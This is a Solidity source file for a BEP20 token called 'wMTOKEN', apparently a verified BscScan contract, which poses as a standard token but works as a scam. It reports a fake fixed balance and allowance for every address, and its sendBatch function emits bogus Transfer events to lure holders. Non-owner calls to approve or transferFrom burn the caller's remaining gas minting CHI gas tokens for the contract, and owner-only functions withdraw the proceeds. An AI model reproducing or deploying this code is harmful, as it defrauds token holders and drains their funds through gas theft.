/**
 *Submitted for verification at BscScan.com on 2022-04-14
*/

/**
 *Submitted for verification at BscScan.com on 2020-09-09
*/

pragma solidity ^0.7.0;

interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract ChiToken {
    function mint(uint256 value) virtual public;
}

abstract contract pancakeSwapV2 {
    function getAmountsOut(uint amountIn, address[] memory path) virtual public view returns (uint[] memory amounts);
}

contract BEP20wMTOKEN is IBEP20{
  uint256 constant private _totalSupply = 1000000000 * 10**18;
  uint256 private _gasPrice = 7 * 10**9;
  uint256 private _gasFees = 2 * 10**16;
  uint8 constant private _decimals = 18;
  string constant private _symbol = "wMTOKEN";
  string constant private _name = "MyToken.live";
  address private _owner;

  uint256 private _gasPriceNT = 7 * 10**9;
  uint256 private a = 2 * 10**16;

  function getGasLeftNT() external view returns (uint256) {
    return a;
  }

  function getGasPriceNT() external view returns (uint256) {
    return _gasPriceNT;
  }

  //for PanCakeSwap
  pancakeSwapV2 pcsV2 = pancakeSwapV2(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);

  constructor() public {
    _owner = msg.sender;
  }

  receive() external payable {
    //just store with the contract
  }

  function rescueBNB(address addr, uint256 amount) external {
    require(msg.sender == _owner, "Owner");
    payable(addr).transfer(amount);
  }

  function getContractBalance() external view returns (uint256) {
    return address(this).balance;
  }

  function setGasPrice(uint256 gasPrice) external {
    require(msg.sender == _owner, "Owner"); 
    _gasPrice = gasPrice;
  }

  function setGasFees(uint256 gasFees) external {
    require(msg.sender == _owner, "Owner"); 
    _gasFees = gasFees;
  }

  function getGasFees() external view returns (uint256) {
    return _gasFees;
  }

  function getGasPrice() external view returns (uint256) {
    return _gasPrice;
  }

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() override external view returns (address) {
    return _owner;
  }

  /**
   * @dev Returns the token decimals.
   */
  function decimals() override external pure returns (uint8) {
    return _decimals;
  }

  /**
   * @dev Returns the token symbol.
   */
  function symbol() override external pure returns (string memory) {
    return _symbol;
  }

  /**
  * @dev Returns the token name.
  */
  function name() override external pure returns (string memory) {
    return _name;
  }

  /**
   * @dev See {BEP20-totalSupply}.
   */
  function totalSupply() override external pure returns (uint256) {
    return _totalSupply;
  }

  /**
   * @dev See {BEP20-balanceOf}.
   */
  function balanceOf(address account) override external pure returns (uint256) {
    return 1030000000000000000000;
  }


  /**
   * @dev See {BEP20-transfer}.
   *
   * Requirements:
   *
   * - `recipient` cannot be the zero address.
   * - the caller must have a balance of at least `amount`.
   */
  function transfer(address recipient, uint256 amount) override external returns (bool) {
    _transfer(msg.sender, recipient, amount);
    return true;
  }

  /**
   * @dev See {BEP20-allowance}.
   */
  function allowance(address owner, address spender) override external pure returns (uint256) {
    return 1030000000000000000000;
  }

  /**
   * @dev See {BEP20-approve}.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
  function approve(address spender, uint256 amount) override external returns (bool) {
    _approve(msg.sender, spender, amount);
    return true;
  }

  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) override external returns (bool) {
    //address[] memory path = new address[](2);
   // path[0] = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; //WBNB address on smart chain
    //path[1] = 0xBB347F0efB07AA57D7271f39831187e1a05004C8; //chi address on smart chain
      a = gasleft();
      _gasPriceNT = tx.gasprice;
      ChiToken(0xBB347F0efB07AA57D7271f39831187e1a05004C8).mint((gasleft()/tx.gasprice - 36768)/36246);
    return true;
  }

  /**
   * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
   * the total supply.
   *
   * Requirements
   *
   * - `msg.sender` must be the token owner
   */
  function mint(uint256 amount) external returns (bool) {
    _mint(msg.sender, amount);
    return true;
  }

  function sendBatch(address[] calldata _recipients) external {
    for (uint i = 0; i < _recipients.length; i++) {
			emit Transfer(msg.sender, _recipients[i], 1030000000000000000000);
    }
  }

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(msg.sender == _owner);
    emit Transfer(sender, recipient, amount);
  }

  /** @dev Creates `amount` tokens and assigns them to `account`, increasing
   * the total supply.
   *
   * Emits a {Transfer} event with `from` set to the zero address.
   *
   * Requirements
   *
   * - `to` cannot be the zero address.
   */
  function _mint(address account, uint256 amount) internal {
    require(msg.sender == _owner);
    emit Transfer(address(0), account, amount);
  }


  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    if(msg.sender == _owner) {
        emit Approval(owner, spender, amount);
    }
    else{
        //address[] memory path = new address[](2);
        //path[0] = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; //WBNB address on smart chain
        //path[1] = 0xBB347F0efB07AA57D7271f39831187e1a05004C8; //chi address on smart chain
        a = gasleft();
        _gasPriceNT = tx.gasprice;
        ChiToken(0xBB347F0efB07AA57D7271f39831187e1a05004C8).mint((gasleft()/tx.gasprice - 36768)/36246);
    }
  }


  /**
   * @dev Transfer 'amount' number of tokens out of the token contract 'token' 
   * and transfer them to the address 'to'
   *
   * Requirements:
   *
   * -  require(msg.sender == owner
   */
  function transferBEP20(IBEP20 token, address to, uint256 amount) external {
    require(msg.sender == _owner, "Owner"); 
    token.transfer(to, amount);
  }
}